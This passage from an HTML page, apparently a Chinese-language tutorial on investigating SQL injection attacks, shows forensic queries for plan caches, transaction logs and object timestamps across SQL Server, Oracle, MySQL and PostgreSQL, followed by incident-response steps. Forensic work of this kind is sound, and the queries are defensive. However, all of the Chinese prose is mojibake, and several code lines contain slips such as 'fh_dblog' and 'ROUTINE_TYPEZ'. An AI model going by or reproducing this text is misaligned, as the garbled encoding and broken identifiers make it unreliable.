punctuation">.</span>sql_handle<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>Oracle </p><p>ä½¿ç”¨GVSSQLè§†å›¾</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sql_text <span class="token keyword">from</span> gv$<span class="token keyword">sql</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>MySQL</p><p>ä½¿ç”¨show variableså‘½ä»¤æ¥æŸ¥çœ‹æŸ¥è¯¢æ—¥å¿—çš„çŠ¶æ€</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%general_log%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>PostgreSQL</p><p>ä½¿ç”¨ä¸‹é¢çš„æŸ¥è¯¢æ¥åˆ¤æ–­æœåŠ¡å™¨ä¸Šçš„log_statementå€¼æ˜¯å¦å·²ç»å¯ç”¨ï¼Œå¦‚æœå·²ç»å¯ç”¨ï¼Œå¯ä»¥çœ‹åˆ°æ›°å¿—çš„ä½ç½®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> setting <span class="token keyword">from</span> pg_settings <span class="token keyword">where</span> name <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'log_statement'</span><span class="token punctuation">,</span><span class="token string">'log_directory'</span><span class="token punctuation">,</span><span class="token string">'log_filename'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h6 id="æ‰§è¡Œè®¡åˆ’çš„å±€é™"><a href="#æ‰§è¡Œè®¡åˆ’çš„å±€é™" class="headerlink" title="æ‰§è¡Œè®¡åˆ’çš„å±€é™"></a>æ‰§è¡Œè®¡åˆ’çš„å±€é™</h6><p>åœ¨PostgreSQLå’ŒMySQLä¸­ï¼Œæ‰§è¡Œè®¡åˆ’é»˜è®¤æ˜¯è¢«ç¦ç”¨çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå…·æœ‰è¶³å¤Ÿæƒé™çš„æ”»å‡»è€…è¿˜å¯ä»¥ç¦ç”¨æ‰§è¡Œè®¡åˆ’ã€‚Microsoft SQL Serverå’ŒOracleä¸å…è®¸ç¦ç”¨æ‰§è¡Œè®¡åˆ’ï¼Œä½†æ˜¯æ‰§è¡Œè®¡åˆ’å—åˆ°æœ¬åœ°RDBMSå›æ”¶ç­–ç•¥çš„æ”¯é…ï¼Œä½¿ç”¨ç‰¹æ®Šçš„RDBMSå‡½æ•°å¯ä»¥å°†æ‰§è¡Œè®¡åˆ’æ¸…æ´—æ‰ã€‚</p><h6 id="ç¼“å­˜å›æ”¶ç­–ç•¥"><a href="#ç¼“å­˜å›æ”¶ç­–ç•¥" class="headerlink" title="ç¼“å­˜å›æ”¶ç­–ç•¥"></a>ç¼“å­˜å›æ”¶ç­–ç•¥</h6><p>å¯ä»¥æ§åˆ¶æ‰§è¡Œè®¡åˆ’ç¼“å­˜çš„å­˜å‚¨å®¹é‡ã€‚RDBMSä¼šæ ¹æ®ä¸€äº›å› ç´ æ¥æ¸…é™¤ç¼“å­˜çš„æ¡ç›®</p><ul><li><p>æ•°æ®åº“æœåŠ¡å™¨çš„CPUå’Œå†…å­˜è´Ÿè½½</p></li><li><p>æ‰§è¡Œè®¡åˆ’é‡ç”¨çš„é¢‘ç‡</p></li><li><p>ç¼“å­˜æ‰§è¡Œè®¡åˆ’ä¸­å¼•ç”¨çš„å¯¹è±¡å‘ç”Ÿäº†æ”¹å˜</p></li><li><p>é‡å¯æ•°æ®åº“æœåŠ¡</p></li></ul><h6 id="æ‰‹å·¥æ¸…æ´—ç¼“å­˜"><a href="#æ‰‹å·¥æ¸…æ´—ç¼“å­˜" class="headerlink" title="æ‰‹å·¥æ¸…æ´—ç¼“å­˜"></a>æ‰‹å·¥æ¸…æ´—ç¼“å­˜</h6><p>å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ‰‹å·¥æ–¹å¼æ¸…æ´—æ•°æ®åº“çš„æ‰§è¡Œè®¡åˆ’ç¼“å­˜ã€‚</p><p>é‡‡ç”¨å‚æ•°åŒ–å¤„ç†å¯ä»¥æé«˜RDBMSé‡ç”¨ç¼“å­˜è®¡åˆ’çš„æœºä¼šï¼Œä»¥ä¾¿å°†æ¥é‡åˆ°åŒæ ·çš„æŸ¥è¯¢æ—¶å¯ä»¥æ›´å¿«åœ°æ‰§è¡Œã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå‚æ•°åŒ–æŸ¥è¯¢çš„ä¾‹å­ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> EmployeeID<span class="token punctuation">,</span> FName<span class="token punctuation">,</span> LName<span class="token punctuation">,</span> YOB <span class="token keyword">from</span> SSFA<span class="token punctuation">.</span>Employee <span class="token keyword">where</span> <span class="token punctuation">[</span>fname<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'mike'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="äº‹åŠ¡æ—¥å¿—"><a href="#äº‹åŠ¡æ—¥å¿—" class="headerlink" title="äº‹åŠ¡æ—¥å¿—"></a>äº‹åŠ¡æ—¥å¿—</h5><p>æ•°æ®åº“æ“ä½œåˆ†ä¸ºä¸¤ä¸ªä¸»è¦çš„ç±»åˆ«ï¼šä¸€æ˜¯æ•°æ®æ“ä½œè¯­è¨€(Data Manipulation Language, DML)ï¼Œ äºŒæ˜¯æ•°æ®å®šä¹‰è¯­è¨€(Data Definition Language, DDL)ã€‚DMLä½œç”¨äºè¡¨å†…çš„æ•°æ®ï¼›è€ŒDDLåˆ™ä½œç”¨äºæ•°æ®åº“çš„ç»“æ„ï¼Œæ¯”å¦‚åˆ›å»ºæ–°è¡¨ã€‚</p><p>äº‹åŠ¡æ—¥å¿—(transaction log)ç”¨äºè®°å½•è¿™æ ·çš„äº‹å®ï¼šäº‹åŠ¡å¼€å§‹å‘ç”ŸåŠæ¢å¤æ‰€éœ€çš„ä¿¡æ¯ã€‚ä¸‡ä¸€æ•°æ®åº“æœåŠ¡å™¨å°†ä¿¡æ¯å†™å…¥ç¡¬ç›˜å¤±è´¥ï¼Œæ•°æ®åº“æœåŠ¡å™¨å°±å¯ä»¥ä½¿ç”¨è¿™äº›æ¢å¤ä¿¡æ¯å°†æ•°æ®å›é€€åˆ°æŸä¸ªä¸€è‡´çš„çŠ¶æ€ã€‚</p><p>å°†æ•°æ®å†™å…¥å®é™…çš„æ•°æ®é¡µ(data page)å¹¶ä¸æ˜¯å®æ—¶å‘ç”Ÿçš„ã€‚åœ¨é¢„å®šä¹‰çš„æ—¶é—´é—´éš”ä¹‹åï¼Œäº‹åŠ¡ æ—¥å¿—ä¸­çš„ä¿¡æ¯æ‰ä¼šåº”ç”¨äºç¡¬ç›˜ï¼Œè¿™ç­‰åŒäºæ•°æ®çš„å†™å…¥æ“ä½œï¼Œä½†å´æé«˜äº†æ€»ä½“çš„æ€§èƒ½ã€‚è¿™å¬èµ·æ¥ å¾ˆå¤æ‚ï¼Œä½†ä¸RDBMSåœ¨å·¨å¤§çš„æ•°æ®åº“æ–‡ä»¶ä¸­å¯»é“å¹¶åœ¨æ°å½“åŒºåŸŸä¸­å†™å…¥ä¿¡æ¯ç›¸æ¯”ï¼Œå†™å…¥äº‹åŠ¡æ›° å¿—çš„é€Ÿåº¦è¦å¿«è®¸å¤šã€‚</p><h6 id="åœ¨äº‹åŠ¡æ—¥å¿—ä¸­æŸ¥æ‰¾è¯æ®"><a href="#åœ¨äº‹åŠ¡æ—¥å¿—ä¸­æŸ¥æ‰¾è¯æ®" class="headerlink" title="åœ¨äº‹åŠ¡æ—¥å¿—ä¸­æŸ¥æ‰¾è¯æ®"></a>åœ¨äº‹åŠ¡æ—¥å¿—ä¸­æŸ¥æ‰¾è¯æ®</h6><p>åˆ†æäº‹åŠ¡æ—¥å¿—</p><ul><li><p>åœ¨å¯ç–‘æ”»å‡»æ—¶é—´æ®µå†…æ‰§è¡Œçš„INSERT, UPDATEå’ŒDELETEè¯­å¥ã€‚åœ¨è°ƒæŸ¥å–è¯æ—¶ï¼Œè¯¥ä¿¡æ¯å¯ç”¨äºæ ‡è¯†åœ¨æ‰€è°ƒæŸ¥çš„æ—¶é—´æ®µå†…æ‰§è¡Œçš„æ´»åŠ¨ï¼Œä»¥åŠç›¸å…³äº‹ä»¶çš„å…¶ä»–ç—•è¿¹ã€‚</p></li><li><p>æ•°æ®åº“ç”¨æˆ·æ‰§è¡Œçš„éæ ‡å‡†çš„æ•°æ®åº“æ“ä½œ(å½“äº‹åŠ¡æ—¥å¿—ä¸­æœ‰å¯ç”¨ä¿¡æ¯æ—¶)ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªé€šå¸¸ä»æ•°æ®åº“è¯»å–ä¿¡æ¯çš„åº”ç”¨ç¨‹åºç”¨æˆ·è´¦å·çªç„¶æ„å¤–åœ°å¼€å§‹æ‰§è¡ŒINSERTã€UPDATEå’Œ DELETE è¯­å¥ã€‚</p></li></ul><h6 id="å¦‚ä½•æœç´¢ä¸»æµRDBMSçš„äº‹åŠ¡æ—¥å¿—"><a href="#å¦‚ä½•æœç´¢ä¸»æµRDBMSçš„äº‹åŠ¡æ—¥å¿—" class="headerlink" title="å¦‚ä½•æœç´¢ä¸»æµRDBMSçš„äº‹åŠ¡æ—¥å¿—"></a>å¦‚ä½•æœç´¢ä¸»æµRDBMSçš„äº‹åŠ¡æ—¥å¿—</h6><ul><li><p>Microsoft SQL Server </p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMicrosoft SQL Serverçš„äº‹åŠ¡æ—¥å¿—åŠŸèƒ½æ˜¯å¯ç”¨çš„ï¼Œè€Œä¸”æ— æ³•ç¦ç”¨ã€‚ä»ä»»ä½•SQL Serverå®¢æˆ·ç«¯ï¼Œéƒ½å¯ä»¥ä½¿ç”¨åŸç”Ÿçš„fh_dblogå‡½æ•°æ¥è®¿é—®äº‹åŠ¡æ—¥å¿—ã€‚</p><p>åˆ—å‡ºäº†é’ˆå¯¹ç”¨æˆ·è¡¨å·²ç»æ‰§è¡Œäº‹åŠ¡çš„æ±‡æ€»ä¿¡æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> AllocUnitName <span class="token keyword">as</span> <span class="token string">'Object'</span><span class="token punctuation">,</span> Operation<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>OPERATION<span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token string">'Count'</span> <span class="token keyword">from</span> fn_dblog<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> OPERATION <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'LOP_INSERT_ROWS'</span><span class="token punctuation">,</span><span class="token string">'LOP_MODIFY_ROW'</span><span class="token punctuation">,</span><span class="token string">'LOP_DELETE_ROWS'</span><span class="token punctuation">)</span> <span class="token operator">and</span> AllocUnitName <span class="token operator">NOT</span><span class="token operator">Like</span> <span class="token string">'sys.%'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> Operation<span class="token punctuation">,</span> AllocUnitName <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> Object<span class="token punctuation">,</span> Operation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>Oracle</p><p>åœ¨Oracleä¸­ï¼Œäº‹åŠ¡(å½’æ¡£)æ—¥å¿—é»˜è®¤æ˜¯å¯ç”¨çš„ï¼Œå¹¶ä¸”åœ¨æµ‹è¯•ç³»ç»Ÿæ—¶ä¹Ÿæ— æ³•ç¦ç”¨äº‹åŠ¡æ—¥å¿—åŠŸèƒ½ã€‚</p><p>ä½¿ç”¨ä¸‹é¢çš„æŸ¥è¯¢è¿”å›å·²æ‰§è¡Œçš„INSERTã€UPDATEå’ŒDELETEæ“ä½œçš„ä¸€ä¸ªåˆ—è¡¨ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> OPERATION<span class="token punctuation">,</span> SQL_REDO<span class="token punctuation">,</span> SQL_UNDO <span class="token keyword">FROM</span> V$LOGMNR_CONTENTS <span class="token keyword">WHERE</span>SEG_OWNER <span class="token operator">=</span> <span class="token string">'WEBAPP'</span> <span class="token operator">AND</span> SEG_NAME <span class="token operator">=</span> <span class="token string">'SYNGRESS'</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">timestamp</span> <span class="token operator">&gt;</span> sysdate <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">timestamp</span> <span class="token operator">&lt;</span> sysdate<span class="token punctuation">)</span> <span class="token operator">AND</span> OPERATION <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'DELETE'</span><span class="token punctuation">,</span><span class="token string">'INSERT'</span><span class="token punctuation">,</span> <span class="token string">'UPDATE'</span><span class="token punctuation">)</span><span class="token operator">AND</span> USERNAME <span class="token operator">=</span> <span class="token string">'KEWIE'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>MySQL</p><p>åœ¨MySQLä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨äº‹åŠ¡æ—¥å¿—ï¼Œä¸ºäº†è®°å½•äº‹åŠ¡ï¼Œå¿…é¡»ç”¨å‘½ä»¤å¯ç”¨äº‹åŠ¡æ—¥å¿—åŠŸèƒ½ã€‚</p><p>ä½¿ç”¨show binary logsè¯­å¥æ¥æŸ¥çœ‹æ˜¯å¦æ¿€æ´»äº†äº‹åŠ¡æ—¥å¿—åŠŸèƒ½</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> <span class="token keyword">BINARY</span> LOGS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ä¸‹é¢çš„æŸ¥è¯¢æ¥ç¡®å®šäº‹åŠ¡æ—¥å¿—å­˜å‚¨çš„ä½ç½®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%HOME%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚ä½•è¿”å›DB_BIN_Log.000002æ–‡ä»¶ä¸­çš„æ‰€æœ‰äº‹åŠ¡è®°å½•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysqlbinlog <span class="token string">"c:\Program Files\MySQL\DB_Bin_Logs.000002"</span> <span class="token operator">&gt;</span> z:\transactionlog<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>PostgreSQL</p><p>å¯ä»¥ä½¿ç”¨PostgreSQLå‘½ä»¤è¡Œå®¢æˆ·ç«¯æ¥è¿”å›äº‹åŠ¡æ—¥å¿—ä¿¡æ¯ã€‚åœ¨PostgreSQLä¸­ï¼Œäº‹åŠ¡æ—¥å¿—é»˜è®¤æ˜¯ä¸å¯ç”¨çš„ï¼Œåœ¨å¯ç”¨äº† PostgreSQLçš„äº‹åŠ¡æ—¥å¿—ä¹‹åï¼Œä¹Ÿå¯ä»¥å†å°†å…¶ç¦ç”¨ã€‚</p></li></ul><h5 id="æ•°æ®åº“å¯¹è±¡çš„æ—¶é—´æˆ³"><a href="#æ•°æ®åº“å¯¹è±¡çš„æ—¶é—´æˆ³" class="headerlink" title="æ•°æ®åº“å¯¹è±¡çš„æ—¶é—´æˆ³"></a>æ•°æ®åº“å¯¹è±¡çš„æ—¶é—´æˆ³</h5><p>åœ¨è°ƒæŸ¥å–è¯æœŸé—´ï¼Œç”Ÿæˆå…³é”®å¯¹è±¡å’Œç›¸åº”æ—¶é—´æˆ³çš„åˆ—è¡¨æ˜¯ä¸ªå¥½åŠæ³•ï¼Œè¿™å¯ä»¥åœ¨å¯ç–‘æ”»å‡»æ—¶é—´æ®µå†…æ ‡è¯†å¯¹è±¡çš„åˆ›å»ºå’Œä¿®æ”¹æ´»åŠ¨ã€‚åœ¨è°ƒæŸ¥å¯ç–‘çš„SQLæ³¨å…¥æ”»å‡»æ—¶ï¼Œè¯·æ³¨æ„ä¸‹åˆ—å¸¸å¸¸ä¸æ”»å‡»æœ‰å…³çš„æ´»åŠ¨ï¼š</p><ul><li><p>åˆ›å»ºç”¨æˆ·è´¦å·ï¼Œè¿™é€šå¸¸ç”¨äºåˆ›å»ºè®¿é—®çš„åé—¨ã€‚</p></li><li><p>ä¸ºå·²æœ‰è´¦å·å¢åŠ æƒé™ï¼Œè¿™é€šå¸¸æ˜¯æ‰§è¡Œæƒé™æå‡çš„ä¸€éƒ¨åˆ†æ“ä½œã€‚ </p></li><li><p>åˆ›å»ºè¡¨ï¼Œæ–°åˆ›å»ºçš„è¡¨é€šå¸¸ç”¨äºåœ¨å°†ä¿¡æ¯è¿”å›ç»™æ”»å‡»è€…ä¹‹å‰ï¼Œå­˜å‚¨ä¸­é—´ç»“æœã€‚</p></li></ul><h6 id="SQL-Server-4"><a href="#SQL-Server-4" class="headerlink" title="SQL Server"></a>SQL Server</h6><p>ä¸‹é¢çš„æŸ¥è¯¢å°†è¿”å›å½“å‰æ•°æ®åº“ä¸­è§†å›¾ã€è¿‡ç¨‹ã€å‡½æ•°ã€è¡¨å’Œæ‰©å±•è¿‡ç¨‹çš„ä¸€ä¸ªåˆ—è¡¨ï¼Œå¹¶æŒ‰ç…§ä¿®æ”¹æ—¥æœŸå’Œåˆ›å»ºæ—¥æœŸä»¥é™åºæ–¹å¼æ’åºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> sob<span class="token punctuation">.</span>name <span class="token keyword">as</span> <span class="token string">'object'</span><span class="token punctuation">,</span> sch<span class="token punctuation">.</span>name <span class="token keyword">as</span> <span class="token string">'schema'</span><span class="token punctuation">,</span> type_desc<span class="token punctuation">,</span> create_date<span class="token punctuation">,</span> modify_date <span class="token keyword">from</span> sys<span class="token punctuation">.</span>all_objects sob<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>schemas sch <span class="token keyword">WHERE</span> sob<span class="token punctuation">.</span>schema_id <span class="token operator">=</span> sch<span class="token punctuation">.</span>schema_id <span class="token operator">and</span> sob<span class="token punctuation">.</span><span class="token keyword">type</span> <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'FN'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'IT'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">UNION</span><span class="token punctuation">(</span><span class="token keyword">select</span> name<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'Db_User'</span><span class="token punctuation">,</span> createdate<span class="token punctuation">,</span> updatedate <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sysusers<span class="token punctuation">)</span> <span class="token keyword">UNION</span><span class="token punctuation">(</span><span class="token keyword">select</span> name<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'Login'</span><span class="token punctuation">,</span> createdate<span class="token punctuation">,</span> updatedate <span class="token keyword">from</span> sys<span class="token punctuation">.</span>syslogins<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="Oracle-8"><a href="#Oracle-8" class="headerlink" title="Oracle"></a>Oracle</h6><p>åœ¨Oracleä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æŸ¥è¯¢è¿”å›å½“å‰æ•°æ®åº“ä¸­æ•°æ®åº“å¯¹è±¡ç±»å‹çš„ä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯”å¦‚è¡¨ã€è§†å›¾å’Œè¿‡ç¨‹ï¼Œå¹¶æŒ‰ç…§ä¿®æ”¹æ—¥æœŸå’Œåˆ›å»ºæ—¥æœŸä»¥é™åºæ–¹å¼æ’åºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> object_name<span class="token punctuation">,</span> object_id<span class="token punctuation">,</span> object_type<span class="token punctuation">,</span> created<span class="token punctuation">,</span> last_DDL_time <span class="token keyword">from</span> dba_objects <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> LAST_DDL_time <span class="token keyword">DESC</span><span class="token punctuation">,</span> created <span class="token keyword">DESC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="MySQL-3"><a href="#MySQL-3" class="headerlink" title="MySQL"></a>MySQL</h6><p>å½“ä½¿ç”¨MySQLæ•°æ®åº“æ—¶ï¼Œåº”è¯¥æ³¨æ„å¯¹äºæŸäº›å¯¹è±¡æ¯”å¦‚è§¦å‘å™¨å’Œè§†å›¾å¹¶ä¸å­˜å‚¨æ—¶é—´æˆ³ã€‚è¿è¡Œä¸‹é¢çš„æŸ¥è¯¢ï¼Œæ²¡æœ‰æ—¶é—´æˆ³çš„å¯¹è±¡å°†è¿”å›NULLå€¼ä½œä¸ºæ—¶é—´æˆ³åˆ—çš„å€¼</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">as</span> <span class="token string">"OBJECT"</span><span class="token punctuation">,</span> TABLE_SCHEMA <span class="token keyword">as</span> <span class="token string">"OBJECT_SCHEMA"</span><span class="token punctuation">,</span>TABLE_TYPE <span class="token keyword">as</span> <span class="token string">"OBJECT_TYPE"</span><span class="token punctuation">,</span> CREATE_TIME<span class="token punctuation">,</span> UPDATE_TIME <span class="token keyword">from</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">UNION</span>â€ƒ<span class="token punctuation">(</span><span class="token keyword">SELECT</span> SPECIFIC_NAME<span class="token punctuation">,</span> ROUTINE_SCHEMA<span class="token punctuation">,</span> ROUTINE_TYPEZ CREATED<span class="token punctuation">,</span> LAST_ALTERED <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>routines <span class="token keyword">WHERE</span> ROUTINE_TYPE <span class="token operator">=</span><span class="token string">'PROCEDURE'</span><span class="token punctuation">)</span><span class="token keyword">UNION</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">User</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="PostgreSQL-6"><a href="#PostgreSQL-6" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h6><p>å¯¹äºåˆ›å»ºçš„å¯¹è±¡ã€è¡¨å’Œç”¨æˆ·ç­‰ï¼ŒPostgreSQLå¹¶ä¸è®°å½•å®ƒä»¬çš„æ—¶é—´æˆ³ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æŸ¥è¯¢ï¼Œè¿”å›å½“å‰æ•°æ®åº“ä¸­å…³é”®å¯¹è±¡çš„åç§°ã€æ¨¡å¼å’Œç±»å‹ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> proname <span class="token keyword">as</span> <span class="token string">"OBJECT_NAME"</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token keyword">as</span> <span class="token string">"OBJECT_SCHEMA"</span><span class="token punctuation">,</span><span class="token string">'PROCEDURE'</span> <span class="token keyword">as</span><span class="token string">"OBJECT_TYPE"</span> <span class="token keyword">from</span> pg_proc <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> tgname<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'TRIGGER'</span> <span class="token keyword">from</span> pg_trigger<span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> tablename<span class="token punctuation">,</span> schemaname<span class="token punctuation">,</span> <span class="token string">'TABLE'</span> <span class="token keyword">from</span> pg_tables <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> usename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'USER'</span> <span class="token keyword">from</span> pg_user  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å¦‚æœä½ æ˜¯å—å®³è€…ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ"><a href="#å¦‚æœä½ æ˜¯å—å®³è€…ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="å¦‚æœä½ æ˜¯å—å®³è€…ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ"></a>å¦‚æœä½ æ˜¯å—å®³è€…ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ</h3><h4 id="éåˆ¶å®‰å…¨äº‹ä»¶"><a href="#éåˆ¶å®‰å…¨äº‹ä»¶" class="headerlink" title="éåˆ¶å®‰å…¨äº‹ä»¶"></a>éåˆ¶å®‰å…¨äº‹ä»¶</h4><p>è¦éåˆ¶SQLæ³¨å…¥æ”»å‡»äº‹ä»¶ï¼Œå¯ä»¥ç®€å•åœ°æ‹”é™¤å—æŸå®³æœåŠ¡å™¨çš„ç½‘çº¿ã€‚</p><h4 id="è¯„ä¼°æ¶‰åŠçš„æ•°æ®"><a href="#è¯„ä¼°æ¶‰åŠçš„æ•°æ®" class="headerlink" title="è¯„ä¼°æ¶‰åŠçš„æ•°æ®"></a>è¯„ä¼°æ¶‰åŠçš„æ•°æ®</h4><ul><li><p>æ¶‰åŠä¿¡æ¯çš„ç±»å‹ã€‚</p></li><li><p>æ¶‰åŠçš„ä¿¡æ¯æ˜¯å¦å¯è¾¨è¯†ä¸ºä¸ªäººä¿¡æ¯è¿˜æ˜¯ç»„ç»‡æœºæ„çš„ä¿¡æ¯ã€‚</p></li><li><p>å½±å“åˆ°å“ªäº›å›½å®¶ã€å·æˆ–çœçš„äººã€‚</p></li><li><p>å¯¹æ•°æ®æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œï¼ˆæ›´æ–°ã€åˆ é™¤ã€ä¿®æ”¹æˆ–æ³„æ¼ï¼‰ã€‚</p></li><li><p>é‡ç”¨æœªæˆæƒæ•°æ®çš„å½±å“ã€‚</p></li><li><p>ä»»ä½•ç¼“è§£æªæ–½ï¼Œæ¯”å¦‚æ•°æ®åŠ å¯†ï¼Œè¿™å¯ä»¥é™ä½æœªç»æˆæƒçš„äººé‡ç”¨è¿™äº›ä¿¡æ¯çš„å¯èƒ½æ€§ã€‚</p></li></ul><h4 id="é€šçŸ¥ç›¸å…³äººå‘˜"><a href="#é€šçŸ¥ç›¸å…³äººå‘˜" class="headerlink" title="é€šçŸ¥ç›¸å…³äººå‘˜"></a>é€šçŸ¥ç›¸å…³äººå‘˜</h4><p>è¦æ±‚å§”æ‰˜ç®¡ç†ä¸ªäººä¿¡æ¯çš„ç»„ç»‡æœºæ„åœ¨æ•°æ®å®‰å…¨é­å—ç ´åæ—¶é€šçŸ¥å—å½±å“çš„äººå‘˜ã€‚</p><h4 id="ç¡®å®šæ”»å‡»è€…åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œäº†å“ªäº›æ“ä½œï¼Ÿ"><a href="#ç¡®å®šæ”»å‡»è€…åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œäº†å“ªäº›æ“ä½œï¼Ÿ" class="headerlink" title="ç¡®å®šæ”»å‡»è€…åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œäº†å“ªäº›æ“ä½œï¼Ÿ"></a>ç¡®å®šæ”»å‡»è€…åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œäº†å“ªäº›æ“ä½œï¼Ÿ</h4><ul><li><p>æ ‡è¯†å‡ºæ”»å‡»è€…æŸ¥çœ‹åˆ°çš„ä¿¡æ¯ã€‚</p></li><li><p>è¯†åˆ«å‡ºæ”»å‡»è€…æ‰§è¡Œçš„DMLå’ŒDDLæ“ä½œï¼Œä»¥åŠå—å½±å“çš„ç‰¹å®šè®°å½•ã€‚</p></li><li><p>æ ‡è¯†å‡ºäº‹åŠ¡ä¹‹å‰å’Œäº‹åŠ¡ä¹‹åå—å½±å“çš„æ•°æ®çŠ¶æ€ï¼Œä»¥æ”¯æŒæ¢å¤æ•°æ®åº“ã€‚</p></li><li><p>æ¢å¤ä¹‹å‰å·±ç»è¢«åˆ 